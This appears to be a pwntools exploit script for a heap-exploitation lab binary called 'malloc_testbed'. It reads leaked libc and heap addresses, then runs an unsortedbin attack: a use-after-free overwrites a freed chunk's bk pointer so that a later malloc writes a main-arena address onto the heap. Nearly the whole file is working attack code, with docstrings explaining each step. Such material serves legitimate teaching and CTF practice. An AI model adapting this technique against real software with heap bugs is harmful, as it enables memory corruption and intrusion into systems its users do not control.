#!/usr/bin/env python3


from pwn import *

BINARY = './malloc_testbed'
LIBC = './libc.so.6'
ADDR = 'localhost'
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)

# Global index variable to keep track of allocated chunks
INDEX = 0


def conn():
    if args.LOCAL:
        pty = process.PTY
        io = process(elf.path, stdin=pty, stdout=pty, stderr=pty)
        io.timeout(0.1)

        return io

    if args.PWNDBG:
        context.log_level = 'debug'
        context.terminal = ['tmux', 'splitw', '-h']

        return gdb.debug(elf.path, gdbscript='''init-pwndbg''')

    else:
        io = remote(ADDR, PORT)
        io.timeout(0.1)

        return io


def malloc(io, size):
    global INDEX

    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.recvuntil("> ")

    INDEX += 1
    return (INDEX - 1)


def free(io, index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")


def free_address(io, address):
    io.send("3")
    io.sendafter("address: ", f"{address}")
    io.recvuntil("> ")


def edit(io, index, data):
    io.send("4")
    io.sendafter("index: ", f"{index}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")


def read(io, index):
    io.send("5")
    io.sendafter("index: ", f"{index}")
    r = io.recvuntil("\n1) malloc", drop=True)
    io.recvuntil("> ")

    return r


def solve():
    io = conn()

    io.recvuntil("puts() @ ")
    libc.address = int(io.recvline(), 16) - libc.sym.puts
    io.recvuntil("heap @ ")
    heap = int(io.recvline(), 16)
    io.recvuntil("m_array @ ")
    m_array = int(io.recvline(), 16)
    io.recvuntil("> ")

    log.info("libc base found at: " + hex(libc.address))
    log.info("heap base found at: " + hex(heap))
    log.info("m_array found at: " + hex(m_array))

    """
    Request 2 chunks of different sizes. When Chunk A is free()'d, it will be
    too large for the fastbin. It will also be guarded by Chunk B, preventing
    it from being consolidated with the top chunk.
    """
    chunk_a = malloc(io, 0x88)
    chunk_b = malloc(io, 0x18)

    """
    Free Chunk A, causing it to be linked into the unsortedbin.
    """
    free(io, chunk_a)

    """
    Leverage a UAF vulnerability to write to the user data of Chunk A. We are
    going to overwrite the fd and bk pointers of the free()'d chunk. We will
    overwrite fd with garbage as it is ignored during the sort() function of
    malloc(). We are going to write the address of (heap - 16), creating a fake
    chunk that overlaps the fake chunk's bk pointer with the start of the heap.
    This way, when the address of the head of the unsortedbin is written, we
    will be able to easily see it because the first QWORD of the heap is always
    NULL.
    """
    payload = [
        0,
        heap - 0x10
    ]
    edit(io, chunk_a, flat(payload))

    """
    Request a chunk with the same size as Chunk A. malloc() will execute the
    sort routine, partially unlinking Chunk A from the unsortedbin. This will
    cause the address of the main arena that contains the head of the
    unsortedbin to be written to the location pointed to by the bk of Chunk A.
    In this case, this will be the first QWORD of the heap.
    """
    malloc(io, 0x88)


    io.interactive()


if __name__ == "__main__":
    solve()
